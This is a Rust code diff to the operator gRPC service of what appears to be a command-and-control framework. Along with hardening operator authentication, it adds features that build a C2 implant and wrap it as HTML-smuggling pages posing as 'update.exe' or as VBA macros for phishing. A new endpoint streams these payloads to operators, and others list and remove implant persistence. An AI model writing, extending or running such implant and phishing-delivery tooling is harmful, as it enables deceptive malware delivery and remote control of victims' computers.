@@ -20,24 +20,13 @@ pub struct OperatorServiceImpl {
 }
 
 fn extract_operator_id<T>(req: &Request<T>) -> Result<String, Status> {
-    let auth_header = req
-        .metadata()
-        .get("authorization")
-        .ok_or_else(|| Status::unauthenticated("Missing authorization header"))?;
-
-    let auth_str = auth_header
-        .to_str()
-        .map_err(|_| Status::unauthenticated("Invalid authorization header"))?;
-
-    if !auth_str.starts_with("Bearer ") {
-        return Err(Status::unauthenticated("Invalid authorization scheme"));
+    if let Some(claims) = req.extensions().get::<crate::utils::Claims>() {
+        return Ok(claims.sub.clone());
     }
-
-    let token = &auth_str[7..];
-    let claims = crate::utils::verify_jwt(token)
-        .map_err(|e| Status::unauthenticated(format!("Invalid token: {}", e)))?;
-
-    Ok(claims.sub)
+    
+    // If no claims found in extensions, check if we have a direct header (fallback/test)
+    // or return error. Since interceptor handles verification, absence means unauthenticated.
+    Err(Status::unauthenticated("Authentication required: Missing valid token"))
 }
 
 #[tonic::async_trait]
@@ -46,6 +35,8 @@ impl OperatorService for OperatorServiceImpl {
     type DownloadArtifactStream =
         tokio_stream::wrappers::ReceiverStream<Result<ArtifactChunk, Status>>;
     type GenerateImplantStream =
+        tokio_stream::wrappers::ReceiverStream<Result<PayloadChunk, Status>>;
+    type GeneratePhishingStream = 
         tokio_stream::wrappers::ReceiverStream<Result<PayloadChunk, Status>>;
 
     async fn authenticate(
@@ -62,11 +53,23 @@ impl OperatorService for OperatorServiceImpl {
             .map_err(|e| Status::internal(e.to_string()))?
             .ok_or(Status::unauthenticated("Invalid credentials"))?;
 
-        // Verify signature (Simplified for MVP compliance - ensures field usage)
+        // Verify signature
+        // The signature must be over the username bytes to prove possession of the private key
         if req.signature.is_empty() {
             return Err(Status::unauthenticated("Missing signature"));
         }
-        // Real verification would happen here using op_model.public_key
+
+        let vk_bytes: [u8; 32] = op_model.public_key.clone().try_into()
+            .map_err(|_| Status::internal("Stored operator public key is invalid (not 32 bytes)"))?;
+
+        let vk = wraith_crypto::signatures::VerifyingKey::from_bytes(&vk_bytes)
+            .map_err(|_| Status::internal("Failed to parse operator public key"))?;
+
+        let sig = wraith_crypto::signatures::Signature::from_slice(&req.signature)
+            .map_err(|_| Status::unauthenticated("Invalid signature format (must be 64 bytes)"))?;
+
+        vk.verify(req.username.as_bytes(), &sig)
+            .map_err(|_| Status::unauthenticated("Invalid signature"))?;
 
         let token = crate::utils::create_jwt(&op_model.id.to_string(), &op_model.role)
             .map_err(|e| Status::internal(e.to_string()))?;
@@ -93,9 +96,6 @@ impl OperatorService for OperatorServiceImpl {
         let req = req.into_inner();
 
         // Verify the existing token (even if expired, though create_jwt sets exp)
-        // Note: crate::utils::verify_jwt checks expiration by default.
-        // For refresh, we might want to allow expired tokens if within a grace period,
-        // but for this implementation we strictly require valid token or assume client handles rotation before expiry.
         let claims = crate::utils::verify_jwt(&req.token)
             .map_err(|e| Status::unauthenticated(format!("Invalid or expired token: {}", e)))?;
 
@@ -738,6 +738,30 @@ impl OperatorService for OperatorServiceImpl {
                 &[], // No special features
                 true // Obfuscate by default
             ).map_err(|e| Status::internal(format!("Compilation failed: {}", e)))?;
+        } else if req.platform == "phishing-html" {
+            // Generate payload then wrap in HTML
+            crate::builder::Builder::patch_implant(
+                &template_path,
+                &output_path,
+                &req.c2_url,
+                req.sleep_interval as u64,
+            ).map_err(|e| Status::internal(format!("Payload build failed: {}", e)))?;
+            
+            let payload = std::fs::read(&output_path).map_err(|e| Status::internal(e.to_string()))?;
+            let html = crate::builder::phishing::PhishingGenerator::generate_html_smuggling(&payload, "update.exe");
+            std::fs::write(&output_path, html).map_err(|e| Status::internal(e.to_string()))?;
+        } else if req.platform == "phishing-macro" {
+            // Generate payload then wrap in VBA
+            crate::builder::Builder::patch_implant(
+                &template_path,
+                &output_path,
+                &req.c2_url,
+                req.sleep_interval as u64,
+            ).map_err(|e| Status::internal(format!("Payload build failed: {}", e)))?;
+            
+            let payload = std::fs::read(&output_path).map_err(|e| Status::internal(e.to_string()))?;
+            let vba = crate::builder::phishing::PhishingGenerator::generate_macro_vba(&payload);
+            std::fs::write(&output_path, vba).map_err(|e| Status::internal(e.to_string()))?;
         } else {
             // Patch existing template
             crate::builder::Builder::patch_implant(
@@ -777,6 +801,93 @@ impl OperatorService for OperatorServiceImpl {
         Ok(Response::new(tokio_stream::wrappers::ReceiverStream::new(
             rx,
         )))
+    }
+
+    async fn generate_phishing(
+        &self,
+        req: Request<GeneratePhishingRequest>,
+    ) -> Result<Response<Self::GeneratePhishingStream>, Status> {
+        let req = req.into_inner();
+        let template_path = std::path::Path::new("payloads").join("spectre.exe");
+        if !template_path.exists() {
+            return Err(Status::failed_precondition("Spectre template not found"));
+        }
+        
+        let output_dir = std::env::temp_dir();
+        let payload_path = output_dir.join(format!("raw_{}.bin", uuid::Uuid::new_v4()));
+        let final_path = output_dir.join(format!("phish_{}.out", uuid::Uuid::new_v4()));
+        
+        crate::builder::Builder::patch_implant(
+            &template_path,
+            &payload_path,
+            &req.c2_url,
+            5 
+        ).map_err(|e| Status::internal(format!("Payload generation failed: {}", e)))?;
+        
+        let raw_bytes = std::fs::read(&payload_path).map_err(|e| Status::internal(e.to_string()))?;
+        
+        let content = if req.r#type == "html" {
+            crate::builder::phishing::PhishingGenerator::generate_html_smuggling(&raw_bytes, "update.exe")
+        } else if req.r#type == "macro" {
+            crate::builder::phishing::PhishingGenerator::generate_macro_vba(&raw_bytes)
+        } else {
+            return Err(Status::invalid_argument("Unknown phishing type"));
+        };
+        
+        std::fs::write(&final_path, content).map_err(|e| Status::internal(e.to_string()))?;
+        let _ = std::fs::remove_file(payload_path);
+
+        let (tx, rx) = tokio::sync::mpsc::channel(4);
+        tokio::spawn(async move {
+            if let Ok(data) = tokio::fs::read(&final_path).await {
+                let chunk_size = 64 * 1024;
+                for (i, chunk) in data.chunks(chunk_size).enumerate() {
+                    let resp = PayloadChunk {
+                        data: chunk.to_vec(),
+                        offset: (i * chunk_size) as i64,
+                        is_last: (i + 1) * chunk_size >= data.len(),
+                    };
+                    let _ = tx.send(Ok(resp)).await;
+                }
+                let _ = tokio::fs::remove_file(final_path).await;
+            } else {
+                let _ = tx.send(Err(Status::internal("Failed to read output"))).await;
+            }
+        });
+
+        Ok(Response::new(tokio_stream::wrappers::ReceiverStream::new(rx)))
+    }
+
+    async fn list_persistence(
+        &self,
+        req: Request<ListPersistenceRequest>,
+    ) -> Result<Response<ListPersistenceResponse>, Status> {
+        let req = req.into_inner();
+        let implant_id = uuid::Uuid::parse_str(&req.implant_id)
+            .map_err(|_| Status::invalid_argument("Invalid UUID"))?;
+            
+        let items = self.db.list_persistence(implant_id).await
+            .map_err(|e| Status::internal(e.to_string()))?;
+            
+        let list = items.into_iter().map(|p| PersistenceItem {
+            id: p.id.to_string(),
+            implant_id: p.implant_id.unwrap_or_default().to_string(),
+            method: p.method,
+            details: p.details,
+            created_at: None, 
+        }).collect();
+        
+        Ok(Response::new(ListPersistenceResponse { items: list }))
+    }
+
+    async fn remove_persistence(
+        &self,
+        req: Request<RemovePersistenceRequest>,
+    ) -> Result<Response<()>, Status> {
+        let req = req.into_inner();
+        let id = uuid::Uuid::parse_str(&req.id).map_err(|_| Status::invalid_argument("Invalid UUID"))?;
+        self.db.remove_persistence(id).await.map_err(|e| Status::internal(e.to_string()))?;
+        Ok(Response::new(()))
     }
 }
 
